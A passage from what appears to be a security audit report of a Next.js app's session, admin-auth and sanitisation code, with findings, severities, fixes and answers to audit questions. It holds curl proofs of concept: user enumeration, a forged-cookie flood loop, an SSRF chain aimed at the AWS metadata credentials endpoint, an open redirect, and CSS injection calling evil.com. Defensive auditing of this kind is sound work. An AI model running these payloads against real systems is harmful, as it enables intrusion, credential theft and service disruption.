        → same-origin request → SameSite doesn't apply → cookie cleared
        as part of a larger XSS chain.
  Recommendation: remove /api/user/logout from PUBLIC_API_PREFIXES so
  the middleware Origin check applies. Optionally require the session
  cookie to be present (logout is a no-op without one anyway).

■ F-SEC-7 [LOW/INFO] — timingSafeEqual pre-check leaks signature length.
  File: src/lib/access-auth.ts:88-91
  Code:
    const expectedSig = hmac(`${userId}.${expiresAt}`);
    const sigBuf = Buffer.from(sig, "hex");
    const expBuf = Buffer.from(expectedSig, "hex");
    if (sigBuf.length !== expBuf.length || !crypto.timingSafeEqual(sigBuf, expBuf)) return null;
  Issue:
    The length check `sigBuf.length !== expBuf.length` short-circuits the
    `||` BEFORE timingSafeEqual runs. An attacker submitting different sig
    lengths observes:
      - sig with wrong length → very fast null (no comparison)
      - sig with right length (32 bytes) → slower (timingSafeEqual runs)
    This is an observable timing difference between the two code paths.
  Why this is informational only:
    - expBuf is always 32 bytes (HMAC-SHA256 hex output is fixed-size).
    - The attacker already knows HMAC-SHA256 produces 32-byte signatures
      (publicly documented Node.js API). So learning "expected sig length
      is 32 bytes" leaks zero new information.
    - The length check is REQUIRED (crypto.timingSafeEqual throws
      ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH otherwise — verified live).
  Also note: there's a secondary timing leak at access-auth.ts:86
    `if (Date.now() > expiresAt) return null;`
    This short-circuits BEFORE HMAC verification (line 88). An attacker
    submitting forged tokens with past vs. future expiresAt sees different
    response times. But the attacker controls expiresAt (it's in their
    forged token), so they learn nothing.
  Severity: LOW (informational — defense holds).
  Recommendation (optional): compute expectedSig BEFORE the expiresAt
  check, then do expiry check after HMAC verification. This makes the
  code path identical for valid-HMAC-future / valid-HMAC-past /
  invalid-HMAC tokens. Minor hardening.

■ F-SEC-8 [LOW/INFO] — Minor TOCTOU between session read and admin mutation.
  Files:
    - src/lib/admin-auth.ts:23-26    read user → check active+role
    - src/app/api/admin/users/route.ts:65-135   (then performs create)
    - src/app/api/admin/users/[id]/route.ts:31-94  (then performs update)
  Issue:
    The auth check (read user.active, user.role) happens at the START of
    the request. The mutation happens later. If between these the admin
    is deactivated (by another admin, in another request), the current
    mutation still proceeds with the stale "active=true, role=admin"
    snapshot.
  Window: ~milliseconds to tens of milliseconds (DB write latency).
  Real-world impact: a single extra admin mutation after deactivation.
  Severity: LOW (race window is microseconds; exploitation requires
  precise timing and gains the attacker one additional write).
  Recommendation (optional): wrap the auth check + mutation in a
  Prisma transaction with SERIALIZABLE isolation, or re-fetch the user
  immediately before the mutation.

■ F-SEC-9 [MEDIUM] — `?password=` query param still extracted from GET URLs in
  9 admin routes (privacy leak: passwords in URLs).
  Files (GET routes extracting ?password=):
    - src/app/api/messages/route.ts:12
    - src/app/api/admin/security/route.ts:18
    - src/app/api/admin/equipment/route.ts:13
    - src/app/api/admin/security-dashboard/route.ts:12
    - src/app/api/admin/stats/route.ts:8
    - src/app/api/admin/nav/route.ts:9
    - src/app/api/admin/text/route.ts:16
    - src/app/api/admin/content/route.ts:17
    - src/app/api/admin/email/route.ts:23
    - src/app/api/admin/themes/route.ts:13
    - src/app/api/admin/providers/route.ts:13
    - src/app/api/admin/settings/route.ts:102
    - src/app/api/admin/security-dashboard/route.ts:12
    - src/app/api/chat/route.ts:222
  Issue:
    Even though checkAdminAuth IGNORES the password (V17.2.1 fix), the
    `?password=xxx` value is still extracted from the URL. URLs are
    logged by:
      - nginx access logs (default format includes query string)
      - CDN edge logs (Cloudflare, etc.)
      - Browser history (admin's local machine)
      - Referrer headers (if admin clicks an external link)
    An admin who types the URL `?password=mysecret` is leaking their
    plaintext password to all of the above.
  Defense holds:
    The password is NOT USED (auth falls through to cookie check), so
    leaking it is "only" a privacy leak, not an auth bypass.
  But:
    The frontend (StatsDashboard.tsx, SecurityDashboard.tsx per F-29)
    historically sent ?password=xxx in URLs. If any legacy client component
    is still in use, the admin's password is being logged in plaintext
    by nginx/CDN/browser history right now.
  Severity: MEDIUM (defense-in-depth leak — no auth bypass today, but
  plaintext passwords in URL logs is a serious hygiene issue).
  PoC:
    # Admin opens this URL in browser (legacy client behavior):
    https://victim.com/api/admin/security?password=admin123
    # nginx access log captures: GET /api/admin/security?password=admin123
    # Anyone with log read access (sysadmin, log shipper, SRE on-call)
    # has the admin's password in plaintext.
  Recommendation: remove all `const password = url.searchParams.get("password")`
  lines (F-SEC-1). The frontend should send only the cookie, no ?password=.

■ F-SEC-10 [LOW/INFO] — checkAccess (time/day policy) NOT enforced on admin routes.
  Files:
    - src/lib/admin-auth.ts:17-31       no checkAccess call
    - src/lib/admin-session.ts:11-24    no checkAccess call
    - src/app/api/admin/users/route.ts:21-28 (local checkAdmin)  no checkAccess
    - src/app/api/admin/users/[id]/route.ts:15-22                 no checkAccess
    - src/app/api/admin/users/logs/route.ts:12-19                  no checkAccess
  Issue:
    An admin user with allowedHourStart=9, allowedHourEnd=17 is gated
    by /api/user/verify (the UI uses this to disable buttons after hours).
    But the admin API endpoints (create user, change settings, etc.) DO
    NOT call checkAccess. The admin can perform mutations at 3am.
  PoC:
    # At 3am UTC (admin's allowedHours are 9-17):
    curl -X POST https://victim/api/admin/users \
      -H "Cookie: <admin-cookie>" -H "Origin: https://victim" \
      -d '{"username":"nightowl","password":"x","role":"user"}'
    # → 200 OK. Time policy bypassed.
  Severity: LOW (admins typically have unrestricted hours; only relevant
  if admin accounts have time policies applied — unusual config).
  Same as prior F-16 — still NOT fixed.

■ F-SEC-11 [LOW/INFO] — verify endpoint leaks user metadata after deactivation.
  File: src/app/api/user/verify/route.ts:16-50
  Code:
    const session = getSessionFromRequest(request);  // HMAC still valid for stolen cookie
    if (!session) return NextResponse.json({ ok: false });
    const user = await db.accessUser.findUnique({ where: { id: session.userId } });
    if (!user) return NextResponse.json({ ok: false });
    const access = await checkAccess(user.id);  // returns allowed:false if inactive
    return NextResponse.json({ ok: true, user: { role, permissions, ...}, access });
  Issue:
    After deactivation, the user's cookie still verifies (HMAC valid for
    up to 24h). The verify endpoint returns the full user object including
    `role`, `permissions`, `allowedHourStart`, `allowedHourEnd`,
    `allowedDays`, `expiresAt`, `lastLoginAt`. An attacker who steals a
    deactivated user's cookie learns the user's role, permissions, and
    access policy without further auth.
  Severity: LOW (information disclosure — no privilege gained, since
  the admin routes still reject the deactivated user's cookie per
  VC-4).
  Recommendation: short-circuit at verify endpoint: if !user.active,
  return { ok:false } without leaking user data.

■ F-SEC-12 [LOW/INFO] — checkAdminPassword uses findFirst without orderBy.
  File: src/lib/admin-auth.ts:39-53
  Code:
    const adminUser = await db.accessUser.findFirst({
      where: { role: "admin", active: true },
    });
  Issue:
    If two admins exist (e.g., the seed admin + a backdoor admin created
    via F-NEW-2), findFirst picks one arbitrarily (SQLite returns based
    on rowid order — implementation-defined). Password verification may
    pass or fail unpredictably depending on which admin is picked.
  Impact: only affects the checkAdminPassword function (used by
    reset-admin-password.sh and install.sh), not checkAdminAuth. The
    runtime admin auth path uses findUnique on session.userId, which
    is deterministic.
  Severity: LOW (script-side only — not exploitable via HTTP).
  Same as prior F-15 — still NOT fixed.

■ F-SEC-13 [LOW/INFO] — loginAttempts Map has no periodic sweep (memory leak).
  File: src/app/api/user/login/route.ts:22-34
  Code:
    const loginAttempts = new Map<string, { count: number; resetAt: number }>();
    function checkRateLimit(ip: string): boolean {
      const now = Date.now();
      const record = loginAttempts.get(ip);
      if (!record || now > record.resetAt) {
        loginAttempts.set(ip, { count: 1, resetAt: now + RATE_LIMIT_WINDOW });
        return true;
      }
      if (record.count >= RATE_LIMIT_MAX) return false;
      record.count++;
      return true;
    }
  Issue:
    Stale entries (resetAt < now) are only deleted when the same IP
    makes a new request. An attacker rotating through a large IP pool
    (X-Forwarded-For spoofing per F-9) leaves entries forever. Memory
    grows unbounded.
  Severity: LOW (DoS via memory exhaustion — requires F-9 to be
  exploitable, which it is).
  Same as prior F-25 — still NOT fixed.
  Note: middleware.ts:58-64 DOES have a sweep (5min interval) for the
  middleware rateLimitMap — only the per-route loginAttempts Map in
  /api/user/login/route.ts:22 is missing the sweep.

■ F-SEC-14 [LOW/INFO] — HMAC payload splits on "." (fragile to userId format change).
  File: src/lib/access-auth.ts:69, 81-83
  Code:
    const payload = `${userId}.${expiresAt}`;     // line 69
    const parts = decoded.split(".");             // line 81
    if (parts.length !== 3) return null;          // line 82
    const [userId, expiresAtStr, sig] = parts;    // line 83
  Issue:
    If userId ever contains a "." (e.g., if cuid is replaced with
    email-style identifiers like "user@example.com"), the split on "."
    produces >3 parts and verifySessionToken returns null. ALL sessions
    immediately invalidate. Authentication breaks site-wide.
  Currently safe: cuid is alphanumeric (no dots).
  Severity: LOW (latent — not exploitable today, fragile to future
  schema change).
  Same as prior F-13 — still NOT fixed.

■ F-SEC-15 [LOW/INFO] — Stale loginAttempts Map + bcrypt timing enables user enumeration.
  Files:
    - src/app/api/user/login/route.ts:58-63   (findUnique → returns null
       instantly for nonexistent user)
    - src/app/api/user/login/route.ts:66-70   (verifyPassword → bcrypt
       takes ~100ms for EXISTING user)
  Issue:
    /api/user/login returns 401 instantly for nonexistent usernames
    (no bcrypt.compare called), but takes ~100ms for existing usernames
    (bcrypt.compare runs). Timing difference reveals username existence.
  PoC:
    time curl -X POST https://victim/api/user/login \
      -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"wrong"}'
    # → ~100ms (bcrypt.compare runs)
    time curl -X POST https://victim/api/user/login \
      -H "Content-Type: application/json" \
      -d '{"username":"nonexistent1234","password":"wrong"}'
    # → ~5ms (no bcrypt.compare)
  Defense: response body is identical (`{"ok":false,"error":"invalid_credentials"}`).
  Only timing leaks. The /api/user/login rate limit (5/15min) limits the
  enumeration speed, but combined with F-9 (X-Forwarded-For spoofing),
  the rate limit is bypassable.
  Severity: LOW (timing-based enumeration, requires many requests).
  Same as prior F-14 — still NOT fixed.
  Recommendation: run `bcrypt.compare(password, DUMMY_HASH)` on
  user-not-found to equalize timing.

■ F-SEC-16 [INFO] — Middleware `hasValidSession` skips HMAC (structural check only).
  File: src/middleware.ts:70-93
  Code:
    function hasValidSession(cookieHeader: string): boolean {
      ...
      const token = cookies["access_session"];
      if (!token) return false;
      try {
        const decoded = Buffer.from(decodeURIComponent(token), "base64").toString("utf8");
        const parts = decoded.split(".");
        if (parts.length !== 3) return false;
        const [userId, expiresAtStr] = parts;
        const expiresAt = parseInt(expiresAtStr, 10);
        if (isNaN(expiresAt) || Date.now() > expiresAt) return false;
        // در middleware نمی‌تونیم HMAC رو verify کنیم چون SESSION_SECRET بهش دسترسی نداریم
        // فقط ساختار رو چک می‌کنیم — API route اصلی خودش HMAC رو verify می‌کنه
        return userId.length > 0;
      } catch { return false; }
    }
  Issue:
    The comment on line 87 claims middleware cannot verify HMAC because
    SESSION_SECRET "isn't available" — this is FALSE. process.env.SESSION_SECRET
    IS available in Next.js middleware (it runs on the Node.js runtime,
    not the Edge runtime, by default — and even on Edge, env vars are
    available at request time).
    Middleware only checks STRUCTURE (3 parts, parseable expiresAt,
    non-empty userId, future expiry). An attacker can forge a structurally-
    valid token (e.g., `base64("admin_id.9999999999999.00")`) that passes
    middleware but fails at the API layer's HMAC check.
  Defense currently holding: API layer (access-auth.ts:78-96) does the
    real HMAC check. So forged tokens pass middleware but get 401 from
    the API.
  But:
    (a) Defense-in-depth is weakened — middleware doesn't catch forged
        tokens early; they reach the API route and trigger a DB lookup
        (db.accessUser.findUnique) per request. An attacker can flood
        with structurally-valid forged tokens → DB load amplification.
    (b) The misleading comment ("SESSION_SECRET unavailable") may
        discourage future maintainers from adding the HMAC check.
  PoC (load amplification):
    # Forged token that passes middleware but fails API HMAC:
    TOKEN=$(node -e 'console.log(Buffer.from("admin.9999999999999.00").toString("base64"))')
    while true; do
      curl -s "https://victim/api/admin/users" -H "Cookie: access_session=$TOKEN" -o /dev/null
    done
    # Middleware lets request through (structural check passes).
    # API layer hits db.accessUser.findUnique → DB load per request.
    # Each request is rejected, but DB CPU is consumed.
  Severity: LOW/INFO (defense holds at API layer; DoS amplification only).
  Same as prior F-1 (recommendation was to verify HMAC in middleware) —
  still NOT fixed.

================================================================================
ANSWERS TO THE 10 AUDIT QUESTIONS
================================================================================

Q1. Is password fallback truly removed from checkAdminAuth? (V17.2.1 claim)
  → YES. VERIFIED TRUE. admin-auth.ts:17 — `_password?: string` param
    is never referenced in the function body (grep: 0 uses). Auth path
    is now exclusively: getSessionFromRequest → db.accessUser.findUnique
    → active check → role check. The F-NEW-1 backdoor is closed.
    Caveat: 16 call sites still extract `?password=`/`body.password`
    and pass it to checkAdminAuth (now ignored). See F-SEC-1, F-SEC-9.

Q2. Can session cookie be forged? (HMAC verification)
  → NO. HMAC-SHA256 with strong SESSION_SECRET (256-bit if install.sh
    was used). Live PoC: forged token with correct-length sig="aa"*32
    → crypto.timingSafeEqual returns false → null returned. Forged
    token with wrong-length sig → length mismatch → null returned.
    Exception: if SESSION_SECRET is weak (F-SEC-3) or leaked, forgery
    becomes possible. Currently the install.sh path generates a
    strong secret and .env contains no SESSION_SECRET at all (app
    fails closed if missing).

Q3. timingSafeEqual usage — any length leak?
  → YES (informational only). access-auth.ts:91 — length pre-check
    `sigBuf.length !== expBuf.length` short-circuits before
    timingSafeEqual runs. Attacker can distinguish "wrong-length sig"
    (fast null) from "right-length sig" (slow timingSafeEqual). This
    leaks that the expected sig length is 32 bytes — which is already
    public knowledge (HMAC-SHA256 hex = 64 chars = 32 bytes). The
    length pre-check is REQUIRED because crypto.timingSafeEqual throws
    ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH on different-length inputs.
    See F-SEC-7.

Q4. Can session be reused after user deactivated?
  → NO. VERIFIED TRUE. All 5 admin auth gates (checkAdminAuth,
    checkAdminSession, 3 local checkAdmin functions) fetch the user
    record fresh on every request and reject when active===false.
    The cookie's HMAC remains valid for up to 24h, but the
    authorization decision depends on a live DB read. Deactivation
    is effective on the next request. See VC-4.
    Caveat: /api/user/verify leaks user metadata (role, permissions)
    even after deactivation — see F-SEC-11.

Q5. Can session be reused after password changed?
  → YES. **HIGH severity**. Schema has no tokenVersion / sessionVersion
    field. createSessionToken signs only userId + expiresAt.
    verifySessionToken checks signature + expiry only. Password change
    updates passwordHash but does NOT bump any version or invalidate
    cookies. A stolen cookie remains valid for up to 24h after the
    admin changes their password. See F-SEC-2 (PoC included).

Q6. SESSION_SECRET entropy check — can weak placeholder bypass?
  → PARTIALLY. access-auth.ts:21-43 rejects 6 explicit placeholders
    ("build-placeholder", "change-me", "secret", "your-secret-here",
    "changeme", "") and any string shorter than 32 chars. But it does
    NOT compute real entropy. Live test: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    (32×'a'), "passwordpasswordpasswordpassword", "dev-secret-dev-secret-
    dev-secret!!" all PASS the check. install.sh:93 generates a real
    strong secret (openssl rand -hex 32) so production installs are safe.
    See F-SEC-3.

Q7. Cookie attributes (HttpOnly, Secure, SameSite, Path, Max-Age)
  → MOSTLY CORRECT. login/route.ts:106-112:
    httpOnly: true ✓
    secure: process.env.NODE_ENV === "production"  ⚠️ false in dev/missing-NODE_ENV (F-SEC-5)
    sameSite: "strict" ✓
    path: "/" ✓
    maxAge: 86400 ✓ (matches SESSION_DURATION_HOURS)
    domain: (unset, defaults to host-only) ✓
    MISSING: __Host- prefix (F-SEC-4)
    MISSING: explicit Domain restriction (defaults are OK)

Q8. Is logout CSRF-protected?
  → NO. /api/user/logout is in PUBLIC_API_PREFIXES (middleware.ts:30)
    → no Origin/Host check on POST. The route handler does no auth,
    no token check. Any cross-site POST hits the handler, which sets
    Set-Cookie: access_session=; Path=/; Expires=epoch.
    PARTIAL DEFENSE: The deletion Set-Cookie has no SameSite attribute
    → modern browsers treat as Lax → cross-site POST is in cross-site
    context → Set-Cookie is IGNORED per RFC 6265bis-11 §5.3 step 11.6.
    So modern browsers defend; legacy browsers vulnerable. Combined
    with F-18 (CSP 'unsafe-inline'), an XSS can call logout same-origin
    → SameSite doesn't apply → cookie cleared. See F-SEC-6.

Q9. Can a regular user escalate to admin?
  → NO. VERIFIED TRUE. All admin routes fetch user.role from DB on
    every request and reject when role !== "admin". The cookie contains
    only userId (HMAC-signed), never role. Role is never trusted from
    client input (body.role in /api/admin/users is the role to ASSIGN
    to a new user, not the role of the requester — and the requester
    must already be admin to call this route). See VC-5.

Q10. Race conditions in session verification?
  → MINOR TOCTOU. The auth check (read user.active, user.role) happens
    at the START of the request, the mutation happens later. If between
    these the admin is deactivated (by another admin, in another
    request), the current mutation still proceeds with the stale
    "active=true, role=admin" snapshot. Window: ~ms to tens-of-ms.
    Impact: one extra admin mutation after deactivation. Severity LOW.
    No TOCTOU within a single request (read and check are sequential,
    no caching). See F-SEC-8.

================================================================================
NO CODE CHANGES MADE (read-only audit per task instructions)
================================================================================

Final verdict:
  V17.2.1's claim "حذف password fallback — session-only" is VERIFIED TRUE
  at the auth-library layer (admin-auth.ts:17). The F-NEW-1 backdoor is closed.

  However, the V17.2.1 fix is INCOMPLETE in three respects:
  (a) 16 admin routes still extract `?password=` from URLs and pass it to
      checkAdminAuth (now ignored — dead code). This is a privacy leak
      (passwords in nginx logs, browser history, referrer headers) and a
      maintenance hazard (future refactor could silently re-enable the
      backdoor). See F-SEC-1, F-SEC-9.
  (b) The session lifecycle is still purely stateless with NO server-side
      invalidation path. A stolen cookie remains valid for up to 24h after
      password change. See F-SEC-2 (HIGH — pre-existed V17.2.1).
  (c) SESSION_SECRET entropy check is length-based only. install.sh
      generates a strong secret so production is safe, but the check
      itself would not catch a 32-char low-entropy secret. See F-SEC-3.

  The 7 VERIFIED-CORRECT items confirm:
    - HMAC-SHA256 prevents cookie forgery
    - Deactivation IS effective on next request
    - No user→admin privilege escalation
    - timingSafeEqual used correctly (length pre-check is required)
    - Cookie attributes mostly correct (HttpOnly, SameSite=strict, Path=/)

  Recommend V17.3 hardening sprint focused on F-SEC-2 (tokenVersion) +
  F-SEC-9 (remove ?password= plumbing) + F-SEC-4 (__Host- prefix). These
  3 fixes close the remaining auth-bypass surface and complete the
  V17.2.1 cleanup.

HEADLINE ISSUES (priority order — advisory only, DO NOT FIX per task)
================================================================================
1. SEC-06-C4 / C5 — Live SESSION_SECRET in git history AND in worklog.md
   at HEAD. Anyone with repo access can forge admin sessions. Mitigation:
   rotate SESSION_SECRET on all deployments; rewrite git history
   (git filter-repo --invert-paths --path .env OR BFG --delete-blobs);
   redact the literal value from worklog.md (lines 8142, 8146).
2. SEC-06-C6 — Tracked db/custom.db ships admin/admin123 (verified) +
   testuser bcrypt hashes + admin PII. Anyone cloning the repo gets a
   working admin login. Mitigation: untrack db/custom.db (git rm --cached),
   add /db/*.db to .gitignore, ship an empty seed script instead. Force
   password change on first login.
3. SEC-06-C3 — GET /api/admin/settings returns bot tokens in plaintext.
   Mitigation: mask tokens server-side (return hasBaleToken/hasTelegramToken
   booleans + last4 chars; require a separate "reveal" endpoint behind
   re-authentication if needed). Apply same masking to
   POST /api/admin/providers create/update responses (line 71, 94).
4. SEC-06-C1 / C2 — Plaintext storage of AI keys, bot tokens, SMTP pass.
   Mitigation: add an encrypt-at-rest helper keyed off SESSION_SECRET
   (AES-256-GCM), encrypt on write in settings/providers routes, decrypt
   on read in lib/{settings,providers,bale,telegram}.ts. Update
   prisma/schema.prisma:101 comment or rename column to encryptedApiKey.
5. SEC-06-H1 — Dev .env missing SESSION_SECRET. Mitigation: add a
   .env.example with `SESSION_SECRET=""` placeholder + a `dev.sh` that
   auto-generates one if missing (mirror install.sh:93).
6. SEC-06-C7 — GitHub PAT in .git/config remote URL. Mitigation: switch
   to SSH or use a git credential helper / GH_TOKEN env var; rewrite
   .git/config. Rotate the PAT immediately (it has been on disk long
   enough that prior SEC audits already documented it).
7. SEC-06-L1 — Entropy check blocklist incomplete. Mitigation: extend
   KNOWN_BAD_SECRETS in src/lib/access-auth.ts:28-35 to include the four
   historical placeholder strings, OR add a Shannon-entropy check (>=3.5
   bits/char for hex secrets).
8. SEC-06-L2 — install.sh:286 and reset-admin-password.sh:30,66 echo
   admin123. Mitigation: do not print the password; instead show a
   "password has been reset to default — change it now" prompt.
9. SEC-06-M1 — LLM error path may leak upstream error context.
   Mitigation: log only err.name + err.status, not err.message, when
   the error originates from a fetch() to an LLM provider.

■ SEC-03-6: sanitize-embed.ts regex — SOLID
  File: src/lib/sanitize-embed.ts:17-42
  Code:
    const iframeMatch = input.match(/<iframe[^>]*>/i);
    if (!iframeMatch) return "";
    const iframeTag = iframeMatch[0];
    const srcMatch = iframeTag.match(/src=["']([^"']*)["']/i);
    if (!srcMatch) return "";
    const src = srcMatch[1];
    try {
      const url = new URL(src);
      if (!ALLOWED_DOMAINS.includes(url.hostname)) return "";
    } catch { return ""; }
    return `<iframe src="${src}" frameborder="0" allowfullscreen style="..."></iframe>`;
  Bypass attempts (all rejected):
    1. Quote breakout via `"` in src value:
       Input: `<iframe src="https://aparat.com/x" onload="alert(1)">`
       Regex captures `https://aparat.com/x` (stops at first `"`).
       Output: `<iframe src="https://aparat.com/x" frameborder="0" ...></iframe>` — clean.
       ✓ No breakout. `[^"']*` excludes both `"` and `'`.
    2. HTML entity encoding (`&quot;`):
       Input: `<iframe src="https://aparat.com/x&quot;onload=alert(1)">`
       Captured src: `https://aparat.com/x&quot;onload=alert(1)` (no literal quotes).
       new URL() succeeds (hostname=aparat.com).
       Output iframe HTML: `<iframe src="https://aparat.com/x&quot;onload=alert(1)" ...>`
       Browser parses attribute value as raw bytes between `"`, decodes `&quot;` → `"`
       IN the attribute value (not as delimiter). Result: `src` attribute is set to
       `https://aparat.com/x"onload=alert(1)` (URL with embedded quote) — fails to
       load as URL, no XSS.
       ✓ Not exploitable.
    3. Hostname confusion:
       `evil.aparat.com` → not in allowlist (exact match) → rejected.
       `aparat.com.evil.com` → not in allowlist → rejected.
       `APARAT.COM` → URL parser lowercases → matches → safe (loads real aparat.com).
    4. Protocol-relative / scheme tricks:
       `//aparat.com/x` → `new URL("//aparat.com/x")` throws (no base) → rejected.
       `javascript:alert(1)` → `new URL("javascript:alert(1)").hostname` = "" →
         not in allowlist → rejected.
       `data:text/html,...` → hostname = "" → rejected.
    5. Multiple iframes / multiple src attributes:
       Regex captures only FIRST iframe tag and FIRST src attribute within it.
       Second `<iframe>` or second `src=` is silently discarded. Output is always
       the clean hardcoded template. No injection vector.
    6. Regex DoS:
       Patterns are simple linear quantifiers (`[^>]*`, `[^"']*`) — no nested
       quantifiers, no catastrophic backtracking.
  Verdict: SOLID. No bypass found.
  Note: Output iframe lacks `sandbox` attribute — by design, since aparat.com
    and youtube.com embeds need to run their own player JS. Trusted domains only.

    if ((u.protocol === "https:" || u.protocol === "http:") &&
        allowed.includes(u.hostname)) return url;
    return "about:blank";

■ SEC-03-11 (== F-18): CSP allows 'unsafe-inline' + 'unsafe-eval' — MEDIUM
  File: src/middleware.ts:114
  Code:
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.google.com https://www.gstatic.com",
  Impact:
    - 'unsafe-inline' allows any inline <script> tag to execute. If ANY XSS
      vector is found elsewhere (now or in future), CSP will NOT block it.
    - 'unsafe-eval' allows eval(), new Function(), setTimeout("code"),
      setInterval("code"). Combined with future string-injection vectors,
      opens arbitrary JS execution.
    - Weakens CSP as defense-in-depth mitigation.
  PoC (illustrative — requires a separate XSS vector to chain):
    <!-- If a future XSS injects this, CSP will NOT block it: -->
    <script>alert(document.cookie)</script>
    <!-- Without unsafe-inline, CSP would block this with a console error. -->
  Note: Next.js App Router typically requires 'unsafe-inline' for inline
    hydration scripts unless using nonces. 'unsafe-eval' is needed for some
    dev tools but can be removed in production builds. Recommended: use
    Next.js nonces (https://nextjs.org/docs/app/guides/content-security-policy)
    and drop 'unsafe-eval' in production.
  Severity: MEDIUM (already tracked as F-18, item #11 in fix-priority order).
  Status: No code change in this audit (per task instructions).

■ SEC-03-12 (== F-26): book.cover inline style injection — LOW (CSS only, no JS)
  File: src/components/ArchiveGrid.tsx:156
  Code:
    <div className="book-cover"
         style={{ background: item.cover || "linear-gradient(135deg,#003b00,#00ff41)" }}>
  Input: `item.cover` — admin-controlled string (Book model field, no
    validation in /api/admin/content POST create/update).
  Analysis:
    - React serializes style object to `style="background: <value>"` HTML attr.
    - React HTML-escapes the value (`"` → `&quot;`, `<` → `&lt;`, etc.) so
      CANNOT break out of the style attribute.
    - But CSS property injection IS possible (additional `;`-separated properties
      can be appended):
        item.cover = "red; background-image: url(https://evil.com/track.png?cookie=x)"
      → iframe/div makes a network request to evil.com (limited exfiltration —
        no access to document.cookie via CSS).
        item.cover = "red; animation: ..."
      → CSS animation runs (no JS execution).
        item.cover = "red; behavior: url(#xss)"   ← IE-only, ignored by modern browsers
        item.cover = "red; -moz-binding: url(...)" ← Firefox dropped in 2015
        item.cover = "red; expression(alert(1))"   ← IE-only, dropped
    - Modern browsers: no JS execution possible via inline style attribute.
  Verdict: CSS injection confirmed but NO XSS. Tracked as F-26.
  Severity: LOW (informational).
  Note: Could be hardened with allowlist regex (only `linear-gradient(...)` /
    `radial-gradient(...)` / `#hex` / `url(...)` from approved domains).

■ SEC-03-3 / SEC-03-NEW-1: Nav href allows protocol-relative URLs → OPEN REDIRECT
  File: src/app/page.tsx:475-483
  Code:
    const safeHref = (() => {
      const h = String(item.href || "#");
      if (h.startsWith("#") || h.startsWith("/") || h.startsWith("mailto:") || h.startsWith("tel:")) return h;
      try {
        const u = new URL(h);
        if (u.protocol === "http:" || u.protocol === "https:") return h;
      } catch {}
      return "#";
    })();
  Issue: `startsWith("/")` returns the URL as-is WITHOUT further validation.
    A nav item with `href: "//evil.com"` is accepted unchanged. Browsers
    treat `//evil.com` as a protocol-relative URL → navigates to
    `https://evil.com` (current page's scheme).
  This is NOT XSS (no script execution), but is an OPEN REDIRECT.
  Severity: LOW (open redirect is generally low impact; not directly exploitable
    for XSS in modern browsers due to same-origin policy on the target URL).
  PoC:
    # Admin (or attacker who compromised admin per F-6) creates a nav item:
    curl -s -X POST https://victim.com/api/admin/nav \
      -H "Cookie: <stolen-admin-cookie>" \
      -H "Origin: https://victim.com" \
      -d '{"action":"create","data":{"labelEn":"Click me","href":"//evil.com/phish","target":"_blank","visible":true,"order":1}}'
    # Victim sees the nav item, clicks → navigated to https://evil.com/phish
    # (no script execution, but phishing possible).
  Verdict: NEW finding (not previously tracked). Open redirect, NOT XSS.
  Recommended (advisory only — not applied):
    - Replace `startsWith("/")` with: if startsWith("/") && !startsWith("//")
    - OR: use new URL(h, window.location.origin) and check protocol/host.

3.  PROTOTYPE POLLUTION — PASS
==========================================================================
Searched src/ for: `Object.assign | __proto__ | prototype | constructor[`.
Result: 0 matches in application code.

Cookie parsing in two places uses `Object.fromEntries(...)`:
  - src/middleware.ts:72-78
  - src/lib/access-auth.ts:188-193
Pattern:
    Object.fromEntries(
      cookieHeader.split(";").map(c => {
        const [k, ...v] = c.trim().split("=");
        return [k, v.join("=")];
      })
    )
Object.fromEntries uses [[DefineOwnProperty]] semantics (NOT [[Set]]),
so a cookie named `__proto__[admin]=1` becomes a regular own-property
named `"__proto__[admin]"` — does NOT mutate Object.prototype.
A cookie named `__proto__=...` (string value) becomes a string-valued
own-property — does NOT change the prototype (string assignment via
defineProperty is a no-op for the [[Prototype]] internal slot).

Spread-of-body.data patterns (see #8 Mass Assignment) also use
[[DefineOwnProperty]] under the hood, so `{ ...body.data }` cannot
propagate `__proto__` from body.data to the new object.

No lodash / underscore / defaultsDeep / _.set / _.merge in package.json
(all common PP vectors).

VERDICT: No prototype-pollution vector found.

  # Step 1: as admin, create a malicious provider whose baseUrl points
  # at the AWS IMDS endpoint (or any internal IP).
  curl -s -X POST https://victim.com/api/admin/providers \
    -H "Content-Type: application/json" \
    -b /tmp/admin-cookie.jar \
    -d '{
      "action": "create",
      "data": {
        "name": "custom",
        "label": "evil",
        "model": "x",
        "baseUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "apiKey": "x",
        "enabled": true,
        "priority": 1
      }
    }'

  # Step 2: trigger an LLM call via /api/chat (public endpoint).
  curl -s -X POST https://victim.com/api/chat \
    -H "Content-Type: application/json" \
    -d '{"message":"hi","lang":"en","visitorId":"x"}'

  # The server will now POST to:
  #   http://169.254.169.254/latest/meta-data/iam/security-credentials//chat/completions
  # with body { model: "x", messages: [...], max_tokens: 1000, temperature: 0.7 }
  # The IMDS server ignores the body and returns the IAM creds as JSON.
  # The response is parsed by `await res.json()` (providers.ts:117) and then
  # the LLM client returns `data.choices[0]?.message?.content || ""`
  # — undefined because the IMDS JSON has no `choices` field → returns "".
  # The chat endpoint then sends "" back as the LLM reply.
  #
  # Direct exfil is blocked because the response body is NOT reflected to
  # the visitor. BUT error responses are caught and logged to console
  # (providers.ts:115 `throw new Error("OpenAI API error: " + res.status +
  # " " + err)` → callLLMWithFallback logs via console.error at line 63).
  # If the attacker-controlled server returns a 4xx with body containing
  # internal data, the body is concatenated into the Error.message which is
  # console.error'd server-side. This does NOT reach the attacker directly,
  # but is observable if the attacker has any log-read primitive.
  #
  # More reliably: the attacker hosts their own endpoint at the baseUrl,
  # receives the POST with the Authorization: Bearer header containing
  # any apiKey they set themselves — useless for exfil, but proves the
  # server-side request originates from the victim's IP. Useful for:
  #   - Internal port scanning (timing-based: connection refused vs. hang)
  #   - Bypassing IP allowlists on internal services
  #   - Hitting cloud metadata endpoints in non-AWS clouds that allow
  #     GET-without-body IMDS (e.g. GCP metadata endpoint accepts POST
  #     and returns the service-account token in JSON — exfil via the
  #     same parsing chain as above, returns "" to visitor, but the
  #     attacker's own server can capture the request metadata)
Severity: MEDIUM (admin-gated, no direct response exfil to caller, but
  enables internal network probing from victim IP).

